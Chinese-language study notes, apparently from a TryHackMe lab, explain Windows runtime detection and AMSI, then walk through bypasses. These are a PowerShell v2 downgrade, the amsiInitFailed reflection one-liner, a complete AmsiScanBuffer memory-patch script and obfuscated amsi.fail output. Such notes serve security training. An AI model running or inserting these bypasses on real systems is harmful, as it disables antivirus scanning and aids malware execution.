#### 概述：运行时检测 (Overview: Runtime Detection)

在代码或应用程序的执行过程中，无论使用何种解释器或执行环境，其运行通常都会通过一个**运行时 (Runtime)** 组件。在 Windows 系统中，与 Windows API 调用和 .NET Framework/.NET Core 交互时，最常遇到的运行时包括 **CLR (公共语言运行时 Common Language Runtime)** 和 **DLR (动态语言运行时 Dynamic Language Runtime)**，它们都是 .NET 生态系统的一部分。

**运行时检测 (Runtime Detection)** 措施是指在代码实际执行之前或执行期间，在运行时环境中对其进行扫描和分析，以判断其是否具有恶意意图或行为。根据所采用的检测措施及其背后的技术，这种检测可能基于：

- **字符串签名 (String Signatures)**: 匹配已知的恶意代码片段或标识符。
- **启发式方法 (Heuristics)**: 基于一组规则或经验来评估代码的可疑性。
- **行为分析 (Behavioral Analysis)**: 监控代码在模拟或真实执行中的行为模式。

如果代码被运行时检测机制怀疑为恶意，系统会为其分配一个风险值或状态。如果该值超过预设阈值或状态被明确标记为恶意，运行时环境通常会**停止其执行**，并可能采取进一步行动，如隔离文件/代码、删除文件或向用户/管理员发出警报。

运行时检测措施与标准的、主要基于磁盘文件扫描的传统反病毒程序有所不同，因为它们能够直接从**内存和运行时环境**中进行扫描，分析动态加载的代码、脚本以及内存中的数据。同时，许多现代反病毒产品也会集成或利用这些运行时检测能力，以更深入地了解代码实际发起的 API 调用、系统钩子以及其他动态行为。在某些情况下，反病毒产品可能会将运行时检测流或收集到的数据作为其启发式分析或行为评分的一部分。

---

#### AMSI (反恶意软件扫描接口 - Antimalware Scan Interface)

**AMSI (Antimalware Scan Interface)** 是微软在 Windows 10 及后续版本中引入的一项重要安全功能。它提供了一个标准的、通用的接口，允许任何应用程序或服务（尤其是脚本宿主和执行环境）能够直接与安装在机器上的反恶意软件产品（如 Windows Defender 或第三方 AV）进行集成和交互。

其核心目的是在诸如 PowerShell 脚本、VBScript、JavaScript、Office VBA 宏以及 .NET 程序集等内容**在内存中执行之前**，将其内容发送给已注册的 AMSI 提供程序（即 AV 产品）进行扫描和评估。根据微软的官方说法："Windows 反恶意软件扫描接口 (AMSI) 是一种通用的接口标准，它允许您的应用程序和服务与机器上存在的任何反恶意软件产品集成。AMSI 为您的最终用户及其数据、应用程序和工作负载提供增强型恶意软件保护。"

##### 1. AMSI 响应代码 (AMSI Response Codes)

AMSI 提供程序在扫描内容后，会返回一个结果代码，以指示其对所扫描内容的判定。这些代码决定了后续的操作（例如，是否允许执行）。主要的响应代码包括：

- `AMSI_RESULT_CLEAN = 0`: 内容被认为是干净的，允许执行。
- `AMSI_RESULT_NOT_DETECTED = 1`: 未检测到已知的恶意内容，通常也允许执行。
- `AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384`
- `AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479`: 表示内容被管理员策略阻止。
- `AMSI_RESULT_DETECTED = 32768`: 检测到恶意内容，将阻止执行。

这些响应代码主要在 AMSI 的后端处理逻辑或通过第三方工具与 AMSI 交互时才会直接观察到。如果 AMSI 检测到恶意内容并决定阻止执行，通常会向用户或调用程序返回一个错误消息，例如在 PowerShell 中：

PowerShell

```
PS C:\Users\Tryhackme> 'Invoke-Hacks' # 假设 'Invoke-Hacks' 是一个被标记的恶意字符串
At line:1 char:1
+ "Invoke-Hacks"
+ ~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
        + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
        + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

##### 2. AMSI 集成的 Windows 组件 (Windows Components Integrated with AMSI)

AMSI 已被深度集成到以下 Windows 组件中，意味着这些组件在处理和执行内容时都会通过 AMSI 进行扫描：

- **用户账户控制 (UAC)**: 在提升权限时，UAC 可能会使用 AMSI 扫描相关脚本或命令。
- **PowerShell**: 包括 PowerShell 控制台、PowerShell ISE 以及执行的 `.ps1` 脚本和内存中的命令。
- **Windows 脚本宿主 (Windows Script Host - WSH)**: 包括 `wscript.exe` 和 `cscript.exe` 执行的 VBScript 和 JScript 文件。
- **JavaScript 和 VBScript**: 当通过某些宿主环境执行时。
- **Office VBA 宏**: Office 应用程序中的 VBA 宏在执行前会经过 AMSI 扫描。
- **.NET Framework 4.8 及更高版本**: 允许对所有从内存加载的 .NET 程序集进行 AMSI 扫描。

作为攻击者，在针对上述组件执行代码或滥用其功能时，必须充分意识到 AMSI 的存在及其检测能力，并考虑相应的规避策略。

---

#### AMSI Instrumentation (AMSI 内部机制与工作原理)

AMSI 的集成和实现方式可能相当复杂，涉及多个 DLL 文件，并且其具体的执行策略会根据集成的应用程序和执行上下文（例如，是从磁盘加载还是从内存执行）而有所不同。

根据其定义，AMSI 本身主要是一个**接口**，它允许应用程序将内容传递给已注册的反恶意软件产品（AMSI 提供程序）进行扫描。AMSI 会根据正在执行的内容类型和执行层次，使用一个或多个提供程序 DLL (例如 `amsi.dll` 本身，以及 AV 厂商注册的 DLL) 和相关的 API 调用。

- .NET 程序集的监控:
    
    对于由 Windows 开发的 .NET 程序集（例如 PowerShell 核心库），AMSI 的监控通常从 System.Management.Automation.dll 开始。根据微软文档，“程序集是 .NET 应用程序部署、版本控制、重用、激活作用域和安全权限的基本单元。” .NET 程序集在加载和执行过程中，会根据其解释器（如 PowerShell 引擎）以及内容是位于磁盘上还是完全在内存中，来决定如何与其他 DLL 和 API 调用进行交互以触发 AMSI 扫描。
    
- 数据流与 API 调用:
    
    数据（例如，一个 PowerShell 脚本的内容）会从其源头（如用户输入、脚本文件）开始流动。在每一层处理模型中（例如，PowerShell 解析器、脚本块编译），当数据向下流动并准备执行时，各种 API 调用和接口（如 AmsiScanBuffer 或 AmsiScanString）会被触发，将内容提交给 AMSI 提供程序进行扫描。
    
- **关键点**: AMSI 的一个重要特性是它能够扫描**从内存中加载并由 CLR (公共语言运行时) 执行**的内容。这使得传统的、仅依赖磁盘文件扫描的 AV 难以检测到的内存驻留型恶意软件和无文件攻击也受到了 AMSI 的威胁。
    
- 研究焦点 (AmsiScanBuffer):
    
    大部分公开的 AMSI 研究和已知的绕过方法都集中在 Win32 API 层，特别是通过操纵 amsi.dll 中导出的 AmsiScanBuffer API 调用。这个函数是 AMSI 扫描过程中的一个核心环节。
    
- PowerShell 中的 AMSI 监控点 (示例):
    
    为了理解 AMSI 在 PowerShell 中的具体实现方式，可以参考由 Cobbr 维护的 InsecurePowerShell 项目。这是一个移除了 PowerShell 安全特性（包括 AMSI 集成部分）的 GitHub 分叉版本。通过比较其与官方 PowerShell 仓库的提交差异，可以观察到安全功能的实现细节。
    
    在 PowerShell 源码的 src\System.Management.Automation\engine\runtime\CompiledScriptBlock.cs 文件中（路径可能随版本变化），可以看到 AMSI 扫描逻辑的一个关键点，大致如下（简化版）：
    
    C#
    
    ```
    // var scriptExtent = scriptBlockAst.Extent; // 获取脚本内容的范围
    // if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
    // {
    //     // 如果 AmsiUtils.ScanContent 返回检测到恶意内容
    //     var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
    //     throw new ParseException(new[] { parseError }); // 抛出异常，阻止执行
    // }
    
    // if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null) // 另一个可疑内容检查
    // {
    //     HasSuspiciousContent = true;
    // }
    ```
    
    这段代码展示了在编译脚本块时，会调用 `AmsiUtils.ScanContent` 将脚本文本提交给 AMSI 进行扫描。
    

---

#### AMSI 绕过技术 (AMSI Bypass Techniques)

由于 AMSI 对脚本和内存中代码的强大检测能力，攻击者已经开发了多种技术来尝试绕过它。

##### 1. PowerShell 降级攻击 (PowerShell Downgrade Attack)

- **原理**: PowerShell 的许多高级安全特性（包括 AMSI 的深度集成和脚本块日志记录）是在 PowerShell 较新版本（如 v3 及更高版本，尤其是 v5 及更高版本）中引入的。PowerShell v2.0 版本则缺乏这些安全功能。攻击者可以通过强制当前会话或新启动的 PowerShell 进程以 v2.0 版本运行，从而有效绕过这些较新版本才有的安全机制。
- **实现**: 只需一行命令即可启动一个 PowerShell v2.0 进程：
    
    PowerShell
    
    ```
    PowerShell -Version 2
    ```
    
    在 PowerShell v2.0 环境中执行的脚本通常不会受到 AMSI 的全面扫描。 原文中提到的 `full_attack` 变量似乎是一个更复杂的命令字符串模板，用于在降级后的 PowerShell 中执行进一步的混淆命令。
- **检测与缓解**:
    - **移除 PowerShell 2.0 引擎**: 在现代 Windows 系统上，PowerShell 2.0 是一个可选功能，可以被卸载或通过组策略禁用。
    - **应用程序白名单**: 限制或拒绝直接执行 `PowerShell.exe -Version 2`。
    - **监控进程创建事件**: 监控命令行参数中包含 `-Version 2` 的 PowerShell 进程启动。

##### 2. PowerShell 反射 (PowerShell Reflection)

- **原理**: .NET 反射 (Reflection) 机制允许代码在运行时检查和操作程序集 (Assemblies)、类型 (Types) 及其成员（如字段 Fields、方法 Methods）。攻击者可以利用 PowerShell 的反射能力来访问和修改 .NET 内部与 AMSI 功能相关的类和字段。 AMSI 的核心工具类之一是 `System.Management.Automation.AmsiUtils`。这个类中有一个私有静态字段 `amsiInitFailed`，如果这个字段被设置为 `$true`，AMSI 的初始化过程会被标记为失败，后续的 AMSI 扫描通常会直接返回“未检测到”的结果。
- **Matt Graeber 的单行绕过代码**:
    
    PowerShell
    
    ```
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    ```
    
    **代码分解**:
    1. `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`:
        - `[Ref]` 是一个 PowerShell 类型字面量，`.Assembly` 获取其所在的程序集 (通常是 `System.Management.Automation.dll`)。
        - `.GetType('System.Management.Automation.AmsiUtils')` 从该程序集中获取 `AmsiUtils` 类的类型对象。
    2. `.GetField('amsiInitFailed','NonPublic,Static')`:
        - 从 `AmsiUtils` 类型对象中获取名为 `amsiInitFailed` 的字段。
        - `'NonPublic,Static'` 指定该字段是私有的 (NonPublic) 和静态的 (Static)。
    3. `.SetValue($null,$true)`:
        - 将获取到的 `amsiInitFailed` 字段的值设置为 `$true`。
        - 第一个参数 `$null` 表示这是一个静态字段，不需要实例对象。
- **结果**: 一旦 `amsiInitFailed` 字段被设置为 `$true`，当前 PowerShell 进程中的 AMSI 功能基本上就被禁用了，后续的脚本执行通常会返回 `AMSI_RESULT_NOT_DETECTED = 1`。

##### 3. AmsiScanBuffer 内存补丁 (Patching AMSI - AmsiScanBuffer Memory Patch)

- **原理**: AMSI 的核心扫描功能由 `amsi.dll` 中的导出函数 `AmsiScanBuffer`（和/或 `AmsiScanString`）实现。这个 DLL 在 PowerShell 等进程启动时被加载到其地址空间。由于 PowerShell 进程与 `amsi.dll` 通常具有相同的权限级别，因此理论上可以在运行时修改 `amsi.dll` 在内存中的代码，特别是 `AmsiScanBuffer` 函数的开头几个字节，使其直接返回一个“干净”或“未检测到”的结果，从而绕过实际的扫描逻辑。
    
- **高层步骤**:
    
    1. 获取 `amsi.dll` 模块在当前进程中的句柄 (基地址)。
    2. 获取 `AmsiScanBuffer` 函数在内存中的地址。
    3. 修改 `AmsiScanBuffer` 函数地址处内存区域的保护属性，使其变为可写。
    4. 向 `AmsiScanBuffer` 函数的起始位置写入一小段机器码 (Opcode)，这段机器码的作用是修改函数的返回值（例如，使其总是返回 `AMSI_RESULT_CLEAN` 或 `AMSI_RESULT_NOT_DETECTED`）。
- PowerShell 实现:
    
    需要使用 P/Invoke 调用一些 Windows API 函数。
    
    1. **定义 P/Invoke 函数 (C# 语法嵌入 PowerShell)**:
        
        PowerShell
        
        ```
        $MethodDefinition = @"
        using System;
        using System.Runtime.InteropServices;
        
        public class Kernel32 {
            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)] // CharSet.Ansi for string procName
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] // CharSet.Unicode for string lpModuleName
            public static extern IntPtr GetModuleHandle(string lpModuleName);
        
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        }
        "@
        ```
        
    2. **加载 P/Invoke 函数**:
        
        PowerShell
        
        ```
        $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru
        ```
        
    3. **获取 `amsi.dll` 句柄和 `AmsiScanBuffer` 地址**:
        
        PowerShell
        
        ```
        $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll')
        if ($handle -eq [IntPtr]::Zero) { Write-Error "Failed to get handle for amsi.dll"; return }
        
        [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer')
        if ($BufferAddress -eq [IntPtr]::Zero) { Write-Error "Failed to get address for AmsiScanBuffer"; return }
        ```
        
    4. **修改内存保护 (`VirtualProtect`)**:
        
        PowerShell
        
        ```
        [UIntPtr]$Size = [UIntPtr]0x5 # 要修改的字节数 (取决于补丁代码长度)
        [UInt32]$ProtectFlag = 0x40   # PAGE_EXECUTE_READWRITE
        [UInt32]$OldProtectFlag = 0
        if (-not ([Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [ref]$OldProtectFlag))) {
            Write-Error "VirtualProtect failed. Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            return
        }
        ```
        
    5. **准备并写入补丁操作码**: 目标是让 `AmsiScanBuffer` 函数立即返回一个表示“干净”或“错误/无法扫描”的值。原文提供的操作码 `0xB8,0x57,0x00,0x07,0x80,0xC3` 对应汇编指令： `MOV EAX, 0x80070057` (将 `E_INVALIDARG` - 无效参数错误码载入 EAX) `RET` (返回) 这个错误码通常会被 AMSI 调用者解释为扫描未能成功进行或内容无效，从而可能间接导致内容被放行。
        
        PowerShell
        
        ```
        # Opcode for: mov eax, 0x80070057; ret (for x86)
        # For x64, it would typically be: mov rax, <some_value>; ret
        # The provided opcodes are for x86. If PowerShell is x64, this patch might not work correctly or crash.
        # A common x64 patch for returning AMSI_RESULT_CLEAN (0) might be:
        # xor rax, rax; ret  (48 31 C0 C3)
        # or mov rax, 1; ret (B8 01 00 00 00 C3) for AMSI_RESULT_NOT_DETECTED
        # The example uses:
        $buf = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3) # MOV EAX, 0x80070057; RET
        
        [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $BufferAddress, $buf.Length)
        ```
        
    6. (可选) 恢复原始内存保护：
        
        PowerShell
        
        ```
        # [Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $OldProtectFlag, [ref]$OldProtectFlag) | Out-Null
        ```
        
        执行此补丁后，当前 PowerShell 进程中的 `AmsiScanBuffer` 函数行为已被修改。

##### 4. 自动化绕过工具 (Automated Bypass Tools)

- **`amsi.fail`**:
    
    - 这是一个在线工具/服务，它从一组已知的 AMSI 绕过技术中随机选择一种，并对其进行混淆处理，生成一段 PowerShell 代码片段。
    - 其核心思想是“运行时/请求时混淆”，以确保每次生成的绕过代码片段都具有不同的静态签名，从而增加 AV 检测的难度。
    - **示例混淆片段**:
        
        PowerShell
        
        ```
        # $d=$null;$qcgcjblv=[$(('Sys'+'tem').NoRMALizE([CHar](70*66/66)+[CHaR](77+34)+[cHaR]([bYTe]0x72)+[C... (高度混淆的代码)
        ```
        
- **`AMSITrigger:
    
    - 如前所述，`AMSITrigger` 可以帮助自动识别 PowerShell 脚本中具体是哪些字符串或代码片段触发了 AMSI 的警报。
    - 通过这种方式，攻击者可以更有针对性地对这些“坏”的部分进行混淆、编码或重构，而不是盲目地修改整个脚本。这使得绕过 AMSI 的过程更可控，并且可能产生更“干净”（即改动最小）的最终脚本。
    - **示例输出回顾**: 当 `AMSITrigger` 扫描一个包含 AMSI 内存补丁代码的脚本时，它可能会高亮出补丁代码本身作为触发点（因为这些 API 调用和字节序列也可能被静态分析工具或更高级的 AMSI 规则所关注）：
        
        ```
        C:\Users\Tryhackme\Tools>AmsiTrigger_x64.exe -i "bypass.ps1" -f 3
        # ... (P/Invoke definitions and Add-Type) ...
        # $handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll'); <--- Potentially flagged
        # [IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, 'AmsiScanBuffer'); <--- Potentially flagged
        # ... (VirtualProtect and Marshal.Copy calls) ... <--- Potentially flagged
        ```
        
        攻击者可以根据这些反馈，对这些被标记的部分进一步应用混淆技术。